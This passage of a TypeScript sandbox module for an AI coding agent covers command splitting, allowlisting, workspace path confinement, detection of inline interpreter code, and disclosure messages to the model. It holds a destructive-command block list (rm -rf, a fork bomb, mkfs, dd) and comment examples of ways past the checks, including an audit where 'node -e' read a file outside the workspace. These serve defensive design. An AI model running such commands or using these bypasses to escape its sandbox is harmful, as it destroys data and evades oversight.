import { resolve, normalize, relative, sep, dirname, basename, join } from 'node:path';
import { realpathSync } from 'node:fs';
import { platform } from 'node:os';
import { spawn, execFile } from 'node:child_process';
import type { ChildProcess } from 'node:child_process';
import type {
  SheConfig, SandboxResult, SandboxOptions, SandboxJobView, SandboxJobStatus, SandboxJobKillReason,
  CodeExecutionOnCommandLine, IsolationInEffect, ShellDialect, ShellDialectGap, ShellDialectReport,
} from '@she/shared';
import {
  buildConfinedScript, buildWslArgv, planIsolation, isolationInEffect, isolationSpawnEnv,
} from './isolation.js';
import type { IsolationPlan, IsolationMode } from './isolation.js';

export const DESTRUCTIVE_PATTERNS: RegExp[] = [
  /rm\s+.*-[a-z]*r[a-z]*f|rm\s+.*-[a-z]*f[a-z]*r|rm\s+-rf/i,
  /del\s+\/s/i,
  /rmdir\s+\/s/i,
  /\bformat\s/i,
  /\bfdisk\b/i,
  /\bmkfs\b/i,
  /git\s+push/i,
  /git\s+reset\s+--hard/i,
  /\bshutdown\b/i,
  /\breboot\b/i,
  /\breg\s+delete\b/i,
  /\bnet\s+stop\b/i,
  /\btaskkill\b/i,
  /:\(\)\s*\{.*\|.*&\s*\}\s*;?\s*:/,
  />\s*\/dev\/null/,
  /\bdd\s+if=/i,
];

const IS_WINDOWS = platform() === 'win32';

/**
 * Canonical form of a path for identity comparison.
 *
 * Windows produces two spellings of the same file — the 8.3 short form from `os.tmpdir()`
 * and the long form from `realpath` — and comparisons against the raw strings then say
 * "different file" for the same file. `realpathSync.native` resolves both to one spelling;
 * lowercasing on Windows removes the remaining case difference. A path that does not exist
 * yet falls back to its absolute form, which is the best available answer.
 */
function canonicalPath(p: string): string {
  const abs = resolve(p);
  let real = abs;
  try {
    real = realpathSync.native ? realpathSync.native(abs) : realpathSync(abs);
  } catch {
    /* Not created yet — the absolute path is all there is to compare. */
  }
  return IS_WINDOWS ? real.toLowerCase() : real;
}

/**
 * Decode a console buffer.
 *
 * On a Chinese Windows install `cmd.exe` writes CP936 (GBK). Reading those
 * bytes as UTF-8 turns `中文` and `dir` labels into `���`. UTF-8 output (Node,
 * Python, Git) is left alone: a GBK page misread as UTF-8 is full of U+FFFD,
 * a real UTF-8 page is not.
 */
export function decodeConsoleOutput(buf: Buffer): string {
  if (!buf.length) return '';
  const asUtf8 = buf.toString('utf8');
  if (!IS_WINDOWS) return asUtf8;
  const bad = asUtf8.split('\uFFFD').length - 1;
  if (bad === 0) return asUtf8;
  if (bad / Math.max(asUtf8.length, 1) < 0.02) return asUtf8;
  try {
    return new TextDecoder('gbk').decode(buf);
  } catch {
    return asUtf8;
  }
}

/**
 * Scan a command line for the syntax an allowlist has to reason about.
 *
 * Splitting textually is unavoidable (there is no shell parser available and the command has not
 * been run yet), but a naive split on characters is wrong in BOTH directions, and both directions
 * are bugs:
 *
 *   - **Missing a separator** is a bypass. A single `&` was not in the split set, so
 *     `echo hi & del victim` looked like one allowed command while `cmd.exe` ran two.
 *   - **Inventing a separator** is a false refusal. Splitting on `(` and `)` broke
 *     `node -e "console.log(1)"` into three "commands" and refused a perfectly legitimate call.
 *
 * So quotes have to be respected. This walks the line once, tracking which quoting mode it is in,
 * and reports only the separators and redirections that sit OUTSIDE quotes — which is what the
 * shell itself does.
 *
 * Both quote characters are treated as quoting. On `cmd.exe` a single quote is not special, so a
 * line like `echo 'a' & del x` is split at `&` by both this scanner and the shell — the
 * interpretation agrees. The one case where agreement is not guaranteed is an UNTERMINATED quote:
 * this scanner would swallow the rest of the line and miss a separator, so that is reported and
 * refused rather than guessed at.
 */
interface ShellScan {
  /** Command segments, split at unquoted separators. */
  segments: string[];
  /** An unquoted `<` or `>` was seen. */
  redirection: boolean;
  /** A quote was opened and never closed, so the scan cannot be trusted. */
  unterminated: boolean;
}

function scanShellSyntax(command: string): ShellScan {
  const segments: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  let redirection = false;

  const SEPARATORS = new Set(['\n', '&', '|', ';', '(', ')']);

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];

    if (quote) {
      current += ch;
      if (ch === '\\' && quote === '"') {
        // A POSIX escape: consume the next character so `\"` does not end the string.
        if (i + 1 < command.length) { current += command[i + 1]; i++; }
        continue;
      }
      if (ch === quote) quote = null;
      continue;
    }

    // A backslash escape outside quotes: keep it and the escaped character together.
    if (ch === '\\') {
      current += ch;
      if (i + 1 < command.length) { current += command[i + 1]; i++; }
      continue;
    }

    if (ch === '"' || ch === "'") { quote = ch; current += ch; continue; }

    if (ch === '<' || ch === '>') { redirection = true; current += ch; continue; }

    /*
     * `&` immediately after `>` is file-descriptor duplication (`2>&1`, `>&2`), not a separator:
     * cmd.exe and POSIX both run that as ONE command. Splitting it produced a phantom segment
     * named `1`, which two callers then misread in the same direction — the allowlist refused it
     * as an unknown command, and `classifyCommand` read `cat a.txt 2>&1` as a non-read. A real
     * `&` separator is always preceded by a word or a space (`echo a & b`, `echo a&b`), never by
     * the redirection operator it belongs to.
     */
    if (ch === '&' && current.endsWith('>')) { current += ch; continue; }

    if (SEPARATORS.has(ch)) {
      const trimmed = current.trim();
      if (trimmed) segments.push(trimmed);
      current = '';
      continue;
    }

    current += ch;
  }

  const tail = current.trim();
  if (tail) segments.push(tail);

  return { segments, redirection, unterminated: quote !== null };
}

/**
 * Split a command line into the individual commands it runs.
 *
 * An allowlist that only inspects the FIRST command is trivially bypassed: `ls && rm -rf /home`
 * starts with something allowed. Every segment has to be checked, and the separator set has to
 * match what the shell actually treats as a separator — see `scanShellSyntax` for why a single `&`
 * was a real bypass and why the split must respect quotes.
 */
export function splitShellCommands(command: string): string[] {
  return scanShellSyntax(command).segments;
}

/**
 * Whether the line redirects input or output.
 *
 * `>` and `<` are not command separators, but an allowlist that only reads the program name cannot
 * say anything about a redirect target — `git log > /etc/passwd` is an allowed program writing an
 * arbitrary file. Refusing when an allowlist is active is the honest answer, in the same spirit as
 * refusing command substitution: the alternative is to claim a check that is not happening.
 *
 * Both directions are refused. Narrowing this to `>` would be arbitrary, since `<` reads an
 * arbitrary file into an allowed program's stdin.
 */
export function hasUninspectableRedirection(command: string): boolean {
  return scanShellSyntax(command).redirection;
}

/**
 * The command name from one segment, ignoring environment assignments and paths.
 *
 * `FOO=bar /usr/bin/node.exe x.js` → `node`. Returns '' when there is nothing
 * command-like, which callers treat as "refuse" rather than "allow".
 *
 * Quoted paths are handled FIRST. Splitting on whitespace before stripping quotes turns
 * `"C:\Program Files\nodejs\node.exe" x.js` into `program`, because the quote survives on
 * the first token and the second token is just `Files\nodejs\node.exe`. An allowlist that
 * misreads the command name would reject a legitimate path — or, worse, match the wrong
 * entry.
 */
/**
 * The last path component, treating BOTH `/` and `\` as separators on every platform.
 *
 * `path.basename()` is platform-specific: on Linux it does not treat `\` as a separator, so
 * `basename('C:\\tools\\node.exe')` returns `c:\tools\node.exe` (after the extension strip,
 * `c:\tools\node`) instead of `node`.
 *
 * That matters because this function feeds the COMMAND ALLOWLIST. A misread program name is a
 * security-relevant misparse: it can refuse a legitimate command, or — worse — match an allowlist
 * entry against the wrong token. The correct behaviour is to accept either convention regardless of
 * the host OS, because the command string may have come from a config file, a plugin, a scheduled
 * task, or a user pasting a path from another machine.
 *
 * Found by CI on Linux the first time the full gate ran there — the test asserting a Windows path
 * resolves to `node` had only ever executed on Windows.
 */
function lastPathComponent(p: string): string {
  const cut = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  return cut === -1 ? p : p.slice(cut + 1);
}

export function firstCommandToken(segment: string): string {
  const text = segment.trim();
  if (!text) return '';

  // A leading quoted token, quotes included. This is the whole command path.
  const quoted = /^"([^"]+)"|^'([^']+)'/.exec(text);
  if (quoted) {
    const path = quoted[1] ?? quoted[2] ?? '';
    const base = lastPathComponent(path.replace(/[\\/]+$/, ''));
    return base.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '');
  }

  const parts = text.split(/\s+/).filter(Boolean);
  // Skip leading `VAR=value` assignments.
  let i = 0;
  while (i < parts.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(parts[i])) i++;
  const token = parts[i];
  if (!token) return '';
  const unquoted = token.replace(/^["']|["']$/g, '');
  const base = lastPathComponent(unquoted.replace(/[\\/]+$/, ''));
  return base.toLowerCase().replace(/\.(exe|cmd|bat|com)$/, '');
}

/**
 * Whether the line hides commands behind substitution.
 *
 * `$(...)` and backticks run arbitrary commands whose text an allowlist cannot
 * inspect: `echo $(rm -rf /home)` starts with `echo`. Refusing these when an allowlist
 * is active is the only correct answer — the alternative is to claim a check that does
 * not happen.
 */
export function hasCommandSubstitution(command: string): boolean {
  return /\$\(|`/.test(command);
}

/**
 * Resolve a path and prove it stays inside the workspace.
 *
 * Standalone rather than a method so EVERY write path can share one implementation. The jail was
 * a method on `SandboxShell`, and the two places that most needed it — applying a staged patch and
 * undoing a checkpoint — did not have a shell to hand and so did `resolve(root, path)` on their
 * own. Those are now the only paths that can write a file on the user's behalf, and duplicating
 * the rule there would invite exactly the drift that produced the hole.
 *
 * Rejects: `..` traversal, absolute paths that resolve outside, drive-relative paths, and symlinks
 * INSIDE the jail that point outside it (which the textual checks cannot see).
 */
function unquoteToken(raw: string): string {
  const t = raw.trim();
  if (t.length >= 2 && ((t.startsWith('"') && t.endsWith('"')) || (t.startsWith("'") && t.endsWith("'")))) {
    return t.slice(1, -1);
  }
  return t;
}

/** cmd.exe devices. Redirecting here does not create a file. */
function isConsoleDevice(target: string): boolean {
  return /^(nul|con|prn|aux|com[1-9]|lpt[1-9])$/i.test(target);
}

/**
 * Split a command the way cmd.exe does: `\` is a path separator, not an escape.
 * Quotes still hide separators and redirections.
 */
function splitCmdSegments(command: string): string[] {
  const segments: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  const SEPARATORS = new Set(['\n', '&', '|', ';']);
  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (quote) {
      current += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; current += ch; continue; }
    if (SEPARATORS.has(ch)) {
      const trimmed = current.trim();
      if (trimmed) segments.push(trimmed);
      current = '';
      continue;
    }
    current += ch;
  }
  const tail = current.trim();
  if (tail) segments.push(tail);
  return segments;
}

/** Unquoted redirection targets (`>` `>>` `<`). `>&` (fd dup) is not a path. */
function redirectTargets(segment: string): string[] {
  const out: string[] = [];
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    if (quote) {
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    if (ch !== '>' && ch !== '<') continue;
    if (ch === '>' && segment[i + 1] === '&') continue;
    let j = i + 1;
    while (j < segment.length && segment[j] === '>') j++;
    while (j < segment.length && /\s/.test(segment[j])) j++;
    const rest = segment.slice(j);
    const m = /^("[^"]*"|'[^']*'|\S+)/.exec(rest);
    if (m) out.push(unquoteToken(m[1]));
  }
  return out;
}

function cmdTokens(segment: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    if (quote) {
      current += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; current += ch; continue; }
    if (ch === '>' || ch === '<') {
      if (current.trim()) tokens.push(current.trim());
      current = '';
      // Skip the operator and its target; those are checked as redirects.
      let j = i + 1;
      while (j < segment.length && (segment[j] === '>' || segment[j] === '&' || /\s/.test(segment[j]))) j++;
      const rest = segment.slice(j);
      const m = /^("[^"]*"|'[^']*'|\S+)/.exec(rest);
      i = m ? j + m[1].length - 1 : j;
      continue;
    }
    if (/\s/.test(ch)) {
      if (current.trim()) tokens.push(current.trim());
      current = '';
      continue;
    }
    current += ch;
  }
  if (current.trim()) tokens.push(current.trim());
  return tokens;
}

function looksLikePath(token: string): boolean {
  if (!token || token.startsWith('-')) return false;
  if (token === '..' || token.includes('..\\') || token.includes('../')) return true;
  if (/^[a-zA-Z]:[\\/]/.test(token)) return true;
  if (token.startsWith('\\\\')) return true;
  // `/b` `/s` are cmd switches. A real path has another separator (`/etc/passwd`).
  if (token.startsWith('/') && !token.startsWith('//')) {
    return token.slice(1).includes('/') || token.slice(1).includes('\\');
  }
  return false;
}

function staysInWorkspace(workspaceRoot: string, target: string): boolean {
  if (!target || isConsoleDevice(target)) return true;
  try {
    resolveInsideWorkspace(workspaceRoot, target);
    return true;
  } catch {
    return false;
  }
}

/**
 * Refuse shell commands that would read or write outside the workspace.
 *
 * `fs_*` already jails paths. The shell did not: `echo x > ..\file` and `cd C:\`
 * both ran. Quoted `>` (as in `=>` inside a node -e string) is not a redirect.
 */
/**
 * 一条命令是否会把 shell 的工作目录搬到工作区外。
 *
 * 单独成一个函数，因为它虽然和"路径字面量越界"同属越界，处置却不同：`cd` 到外面不是"读了一个外面
 * 的文件"，而是**把后续每一步都搬出去** —— 之后再写任何相对路径都已经不在工作区内。所以它不能
 * 享受"阅读类不限制位置"的豁免，分类器必须把它当成改变位置的动作（第二轮实测 V14）。
 */
function cdEscapeInSegment(segment: string, workspaceRoot: string): string | null {
  const cd = /^(?:cd|chdir|pushd)\s+(?:\/d\s+)?(\S+)/i.exec(segment.trim());
  if (!cd) return null;
  const target = unquoteToken(cd[1]);
  if (staysInWorkspace(workspaceRoot, target)) return null;
  return `cd 目标在工作区外: ${target}`;
}

export function cdEscapeReason(command: string, workspaceRoot: string): string | null {
  for (const seg of splitCmdSegments(command)) {
    const hit = cdEscapeInSegment(seg, workspaceRoot);
    if (hit) return hit;
  }
  return null;
}

export function workspaceEscapeReason(command: string, workspaceRoot: string): string | null {
  // `../` inside quotes is invisible to the redirect scanner, and it is how
  // `node -e "...writeFileSync('../x')"` leaves the workspace. `a..b` (a git
  // range) has no slash and is left alone.
  if (command.includes('../') || command.includes('..\\')) {
    return '路径在工作区外: 命令包含 ../';
  }
  for (const seg of splitCmdSegments(command)) {
    const cdEscape = cdEscapeInSegment(seg, workspaceRoot);
    if (cdEscape) return cdEscape;
    for (const target of redirectTargets(seg)) {
      if (!staysInWorkspace(workspaceRoot, target)) {
        return `重定向目标在工作区外: ${target}`;
      }
    }
    const tokens = cmdTokens(seg);
    for (let i = 1; i < tokens.length; i++) {
      const tok = unquoteToken(tokens[i]);
      if (!looksLikePath(tok)) continue;
      if (!staysInWorkspace(workspaceRoot, tok)) {
        return `路径在工作区外: ${tok}`;
      }
    }
  }
  return null;
}

/**
 * Interpreters that take their PROGRAM as a command-line argument, and the flags that do it.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHY THIS IS A SEPARATE ANSWER FROM THE PATH JAIL
 *
 * The jail above reads the command TEXT. It can resolve a path it can see, and refuse the ones that
 * leave the workspace — `cd C:\`, `> ..\file`, `node C:\evil.js`. All of those were measured to be
 * refused.
 *
 * Code passed as an ARGUMENT is not a path, it is a string, and the string is opaque to any textual
 * scan:
 *
 *   node -e "require('fs').writeFileSync('C:/outside/x','1')"     allowed, writes outside
 *   python -c "import os; print(os.listdir('C:/'))"               allowed, reads outside
 *   powershell -EncodedCommand <base64>                           allowed, unreadable by design
 *
 * Measured on the real shell: every row above passes `workspaceEscapeReason`. There is no textual
 * fix — decoding the string is writing a JavaScript parser for one language and losing for the next
 * one, and `-EncodedCommand` is base64 precisely so that reading it is not the point.
 *
 * So the honest answer has two halves, and this file does both:
 *
 *   1. The command is NOT refused. `node -e` is ordinary work (arithmetic, a JSON tweak, a probe),
 *      and a policy that blocks it teaches people to hide it — `node script.js` in the workspace is
 *      the same power with a file name.
 *   2. The fact IS reported. The result carries which interpreter was invoked inline, the renderer
 *      states that this child process was not path-contained, and the prompt says the boundary is
 *      over command text rather than over processes.
 *
 * The residual risk is therefore DISCLOSED rather than silently denied or silently tolerated. Real
 * containment is Layer 4.2 (WSL2 / Docker), where the process runs in a namespace and the question
 * stops depending on parsing the command at all.
 * ─────────────────────────────────────────────────────────────────────────────
 */
const INLINE_CODE_INTERPRETERS: ReadonlyArray<{ interpreter: string; flags: readonly string[] }> = [
  // Node: `-e`/`--eval` run a program, `-p`/`--print` evaluate an expression and print it.
  { interpreter: 'node', flags: ['-e', '--eval', '-p', '--print'] },
  { interpreter: 'nodejs', flags: ['-e', '--eval', '-p', '--print'] },
  { interpreter: 'bun', flags: ['-e', '--eval'] },
  { interpreter: 'deno', flags: ['eval'] },
  // CPython: `-c` is the program.
  { interpreter: 'python', flags: ['-c'] },
  { interpreter: 'python2', flags: ['-c'] },
  { interpreter: 'python3', flags: ['-c'] },
  { interpreter: 'py', flags: ['-c'] },
  { interpreter: 'perl', flags: ['-e'] },
  { interpreter: 'ruby', flags: ['-e'] },
  { interpreter: 'php', flags: ['-r'] },
  { interpreter: 'lua', flags: ['-e'] },
  { interpreter: 'luajit', flags: ['-e'] },
  { interpreter: 'rscript', flags: ['-e'] },
  /*
   * PowerShell: `-Command` (and its `-c` alias) plus `-EncodedCommand`. The encoded form is listed
   * because it is the same power with the text deliberately unreadable — leaving it out would make
   * "encode it in base64" the way to become invisible to this check.
   */
  { interpreter: 'powershell', flags: ['-command', '-c', '-encodedcommand', '-ec'] },
  { interpreter: 'pwsh', flags: ['-command', '-c', '-encodedcommand', '-ec'] },
  /*
   * A nested shell. `sh -c "cat /etc/passwd"` was measured to pass the jail: the escaped path sits
   * inside a quoted string, and the scanner treats quoted text as one token — which is correct for
   * finding separators, and blind for finding paths inside a program that another shell will parse.
   */
  { interpreter: 'cmd', flags: ['/c', '/k'] },
  { interpreter: 'sh', flags: ['-c'] },
  { interpreter: 'bash', flags: ['-c'] },
  { interpreter: 'zsh', flags: ['-c'] },
  { interpreter: 'dash', flags: ['-c'] },
  { interpreter: 'ksh', flags: ['-c'] },
  { interpreter: 'fish', flags: ['-c'] },
];

/**
 * The flag that makes this one segment inline code, or null.
 *
 * Deliberately per-segment: `echo ok && node -e "…"` has to be seen, and `echo "node -e x"` has to
 * NOT be — a string that merely mentions the pattern is not a child process.
 */
function inlineCodeInSegment(segment: string): { interpreter: string; flag: string } | null {
  const interpreter = firstCommandToken(segment);
  if (!interpreter) return null;
  const entry = INLINE_CODE_INTERPRETERS.find((e) => e.interpreter === interpreter);
  if (!entry) return null;

  // Tokens after the command name, with each flag's `=value` form handled (`--eval=…`).
  const tokens = segment.trim().split(/\s+/).slice(1);
  for (const raw of tokens) {
    const token = unquoteToken(raw).toLowerCase();
    for (const flag of entry.flags) {
      if (token === flag || token.startsWith(`${flag}=`)) {
        return { interpreter, flag };
      }
    }
  }
  return null;
}

/**
 * Whether this command hands a program to an interpreter, so that its paths were never inspected.
 *
 * Returns the FIRST such segment. One is enough to make the statement true, and reporting a list
 * would suggest the rest of the command was contained when the same process could have run all of
 * it.
 */
export function detectInlineCodeExecution(command: string): CodeExecutionOnCommandLine | null {
  for (const segment of splitShellCommands(command)) {
    const hit = inlineCodeInSegment(segment);
    if (hit) return { ...hit, segment: segment.trim().slice(0, 200) };
  }
  return null;
}

/**
 * What the model is told when a command ran without being path-contained.
 *
 * Written as a statement of fact, not a warning: the reader has to be able to act on it (check the
 * code itself, or ask for real isolation), and the two things it must NOT imply are that the command
 * was refused (it ran) or that the jail covered it (it did not).
 */
export function codeExecutionDisclosure(finding: CodeExecutionOnCommandLine): string {
  return `【任意代码执行】${finding.interpreter} ${finding.flag}：程序写在命令行里，`
    + '沙箱的路径检查只能看命令文本、看不到代码字符串内部的路径，'
    + '所以这个子进程的读写**不受工作区边界约束**（它能碰到的东西 = 你账号能碰到的东西）。'
    + '要真的限制它得用层 4.2 的真隔离（WSL2 / Docker）；在那之前，请把这段代码本身当作要审的东西。';
}

/**
 * ─────────────────────────────────────────────────────────────────────────────
 * THE COMMAND THAT RAN IS NOT THE COMMAND THAT WAS WRITTEN
 *
 * A model writes shell out of habit, and the habit is POSIX: `$VAR`, `$(…)`, `'a b'`, `~/x`,
 * `VAR=x cmd`, `# comment`, `2>/dev/null`. On Windows the sandbox hands that text to `cmd.exe`
 * (see `spawnCommand`), which speaks none of it — and the failure mode is the worst one available:
 *
 *   echo $HOME          → prints the literal `$HOME`      exit 0
 *   cp 'a b.txt' out    → `'a` and `b.txt'` as two args   exit 0 or a confusing error
 *   echo $(date)        → prints the literal `$(date)`    exit 0
 *
 * The exit code is 0 and the text looks close enough to plausible that the mistake is read as
 * output. The tool description names the shell BEFORE the call (3b: the model is told what it is
 * writing for); this scan is the after-the-fact half (3a): when a POSIX-only construct is present
 * anyway, the result says which construct it was and what cmd.exe did with it, instead of leaving
 * the reader to notice a subtle difference in the output.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT IS DELIBERATELY NOT DONE
 *
 * Not refused. Every construct below has a legitimate reading — `git commit -m "fix $X"` may well
 * mean the literal text — and refusing ordinary commands teaches people to obfuscate them. The
 * honest answer is the same one `codeExecutionDisclosure` gives: run it, and say what happened.
 *
 * Not a rewriter. Translating `${VAR}` → `%VAR%` looks helpful and is wrong: the same text can be
 * inside a `node -e` program (a JS template literal), a regex, or a commit message. Guessing would
 * turn a reported difference into a silent corruption.
 *
 * Not scanned inside a foreign program. `node -e "a${b}c"` and `powershell -Command "$(Get-Date)"`
 * hand the string to another language, which has its own meaning for it — the segment head decides.
 * `cmd /c "…"` is the exception: that program is still cmd's own text, so it IS scanned.
 * ─────────────────────────────────────────────────────────────────────────────
 */
const CMD_POSIX_GAPS: ReadonlyArray<{ construct: string; test: RegExp; behavior: string; instead: string }> = [
  {
    construct: '$(…)',
    test: /\$\(/,
    behavior: '不做命令替换，`$(…)` 原样留在参数里（程序收到的是这段字面文本）',
    instead: '拆成两次调用：先跑那条命令，再用它的结果；或者整段交给 powershell -NoProfile -Command "…"',
  },
  {
    construct: '`…`（反引号）',
    test: /`/,
    behavior: '不认反引号，它是普通字符',
    instead: '同上：拆成两次调用，或改用 powershell',
  },
  {
    construct: '${VAR} / $VAR',
    test: /\$\{|\$[A-Za-z_]/,
    behavior: '取环境变量用 %VAR%，`$VAR` 是字面文本',
    instead: '写成 %VAR%',
  },
  {
    construct: "'单引号'",
    test: /'[^']*\s[^']*'/,
    behavior: '不认单引号：引号原样传给程序，里面的空格把一个参数拆成两个',
    instead: '用双引号 "…"',
  },
  {
    construct: '~/',
    test: /(?:^|[\s"=])~(?:[\\/]|$)/,
    behavior: '不做 ~ 展开，它被当成名为 `~` 的目录',
    instead: '用 %USERPROFILE%',
  },
  {
    construct: 'VAR=value 前缀',
    test: /^[A-Za-z_][A-Za-z0-9_]*=/,
    behavior: '把 `VAR=value` 当成程序名（"VAR" 不是内部或外部命令）',
    instead: '写成 set VAR=value && 命令',
  },
  {
    construct: '/dev/null',
    test: /\/dev\/(?:null|stdout|stderr)/,
    behavior: '没有 /dev/null，它的空设备叫 nul —— 重定向会去写一个名为 \\dev\\null 的路径',
    instead: '丢弃输出写成 >nul 2>&1',
  },
  {
    construct: '# 注释',
    test: /(?:^|[\s&|;])#\s/,
    behavior: '把 `#` 当命令执行（"# 不是内部或外部命令"）',
    instead: '注释写成 rem …',
  },
];

/** Quoted regions removed, both quote characters. Used to skip a foreign program's own text. */
function stripQuotedText(text: string): string {
  let out = '';
  let quote: '"' | "'" | null = null;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (quote) {
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    out += ch;
  }
  return out;
}

/**
 * The POSIX-only constructs in this command, deduplicated, most three.
 *
 * Capped at three because the point is to name the mistake, not to enumerate it: eight lines of
 * findings on a command whose first line already failed is noise the reader has to pay for. The
 * dedupe is per construct, not per occurrence — `$A` and `$B` are one thing to learn.
 */
export function detectShellDialectMismatch(command: string): ShellDialectGap[] {
  const gaps: ShellDialectGap[] = [];
  for (const segment of splitCmdSegments(command)) {
    if (!segment.trim()) continue;
    const hit = inlineCodeInSegment(segment);
    // A foreign interpreter's inline program is its own language; a nested cmd's program is not.
    const text = hit && hit.interpreter !== 'cmd' ? stripQuotedText(segment) : segment;
    for (const gap of CMD_POSIX_GAPS) {
      if (gaps.length >= 3) return gaps;
      if (gaps.some((g) => g.construct === gap.construct)) continue;
      if (gap.test.test(text)) gaps.push({ construct: gap.construct, behavior: gap.behavior, instead: gap.instead });
    }
  }
  return gaps;
}

/**
 * What the model is told when its POSIX habit met cmd.exe.
 *
 * States three things and stops: which shell parsed it, which construct came out wrong, and what to
 * write instead. It must NOT read as a refusal (the command ran) or as a failure (the exit code is
 * what the program really returned) — a reader that thinks the command failed re-runs it and gets
 * the same silence.
 */
export function shellDialectDisclosure(report: ShellDialectReport): string {
  const lines = [
    // The shell name is already in the sentence, so the parenthetical says which GRAMMAR it
    // speaks rather than repeating a hardcoded interpreter name (portability: no literal here).
    `【shell 方言】这条命令由 ${report.shell} 解析（${report.dialect === 'cmd' ? `${report.shell} 语法` : report.dialect}），`
    + `其中 ${report.gaps.length} 处写法在这里不是你想的意思 —— 命令跑了，但跑的不是你写的那条：`,
  ];
  for (const gap of report.gaps) lines.push(`  · ${gap.construct}：${gap.behavior}；改成 ${gap.instead}`);
  return lines.join('\n');
}

/**
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT A COMMAND IS PROVEN TO DO, AS OPPOSED TO WHAT IT MIGHT DO
 *
 * `workspaceEscapeReason` answers "does the text name a path outside the workspace?". That is a
 * narrower question than the permission model needs, which has two:
 *
 *   1. Does it WRITE?   `cat x` and `rm x` both parse cleanly as "a command with a path". Only one
 *                       of them is safe to run without asking.
 *   2. WHERE does it act?  A write inside the workspace is the agent's own business; the same
 *                       write one directory up is not.
 *
 * Both answers are only ever PROVEN, never guessed. A command that hides its program in a string
 * (`node -e …`), in a substitution (`$(…)`), or in a variable (`%CD%\x`, `$HOME/x`) makes the
 * question unanswerable, and the honest verdict is `unknown` rather than `inside`. Every caller
 * treats `unknown` as the more dangerous of the two, which is what closes the hole the second-round
 * audit measured: `node -e` building a path with `String.fromCharCode(68,58,92,…)` read
 * `D:\AGI\README.txt` while every check in this file said yes.
 *
 * The read-only table is an ALLOWLIST — a verb absent from it is "not proven harmless", which costs
 * a confirmation and never a wrong write. Three verbs that read or write depending on an argument
 * (`find -delete`, `sed -i`, `sort -o`) are listed and then checked for those flags, because
 * `find . -name x` is an ordinary read and refusing it would teach the agent to route around the
 * check rather than use it.
 * ─────────────────────────────────────────────────────────────────────────────
 */

/**
 * Verbs that cannot modify the filesystem, whatever their arguments.
 *
 * Deliberately excludes anything with a write form reachable from an argument — `git branch`,
 * `git tag`, `git stash`, `git config`, `git remote` are all absent and go through
 * `READ_ONLY_SUBCOMMANDS` or are simply not proven. So are `tee`, `xargs`, `awk`, `env` and
 * `less`/`more`: the first three run or write whatever they are handed, `env` launches a command,
 * and the pagers take shell escapes.
 *
 * `cd`/`pushd`/`popd` are here because they only move the shell's own working directory — a
 * `cd` that leaves the workspace is refused separately by `workspaceEscapeReason`, which is the
 * check that actually knows about paths.
 */
const READ_ONLY_VERBS = new Set([
  // POSIX reads: no argument turns these into writes.
  'cat', 'head', 'tail', 'wc', 'file', 'stat', 'ls', 'pwd', 'tree', 'echo',
  'whoami', 'hostname', 'date', 'diff', 'cmp', 'uniq', 'cut', 'column', 'basename',
  'dirname', 'readlink', 'realpath', 'jq', 'ps', 'uptime', 'nproc', 'printenv', 'id',
  // Search: they print matches, they do not edit.
  'grep', 'egrep', 'fgrep', 'rg', 'fd', 'ack', 'ag',
  // Shell state that is not a file.
  'cd', 'pushd', 'popd', 'sleep', 'true', 'false',
  // cmd.exe.
  'type', 'dir', 'findstr', 'where', 'ver',
  // PowerShell.
  'get-content', 'gc', 'get-childitem', 'gci', 'get-item', 'get-location', 'gl',
  'select-string', 'sls', 'test-path', 'resolve-path', 'get-command',
  'select-object', 'measure-object', 'out-string', 'format-list', 'format-table',
  'convertto-json', 'compare-object', 'get-member', 'get-help',
  // Read or write depending on a flag — the flag is checked below before this table is trusted.
  'find', 'sed', 'sort',
]);

/**
 * The flags that turn one of the three flag-dependent readers into a writer.
 *
 * Checked BEFORE the read-only table, so `find . -delete` never reaches the line that would call
 * it a read. `-exec`/`-ok` are here for the same reason as `-delete`: they run an arbitrary
 * program per match, which is a write whenever that program is one.
 */
const WRITING_FLAGS: Record<string, readonly string[]> = {
  find: ['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fprint', '-fprint0', '-fprintf', '-fls'],
  sed: ['-i', '--in-place'],
  sort: ['-o', '--output'],
};

/**
 * Verbs that are read-only only for some subcommands.
 *
 * Names the READS and treats everything else about that verb as a write, because the opposite
 * list — every way `git` can lose work — is the one that ages badly. Hence no `branch`, `tag`,
 * `stash`, `config`, `remote` or `worktree` here: each has a destructive form one flag away.
 */
const READ_ONLY_SUBCOMMANDS: Record<string, readonly string[]> = {
  git: [
    'status', 'log', 'diff', 'show', 'ls-files', 'rev-parse', 'rev-list', 'describe', 'blame',
    'shortlog', 'whatchanged', 'reflog', 'show-ref', 'cat-file', 'ls-remote', 'diff-tree',
    'diff-files', 'diff-index', 'name-rev', 'merge-base', 'count-objects', 'var',
  ],
  npm: ['ls', 'list', 'view', 'info', 'outdated', 'why', 'explain', 'ping', 'doctor'],
  pnpm: ['ls', 'list', 'view', 'info', 'outdated', 'why', 'licenses'],
  yarn: ['list', 'info', 'why', 'licenses', 'versions'],
  cargo: ['tree', 'metadata', 'search', 'verify-project'],
  go: ['version', 'env', 'list', 'doc', 'vet'],
  docker: ['ps', 'images', 'version', 'info', 'logs', 'inspect'],
  kubectl: ['get', 'describe', 'logs', 'version', 'explain', 'api-resources'],
};

/** Verbs whose only harmless call is the one that prints version/build information. */
const VERSION_FLAGS: Record<string, readonly string[]> = {
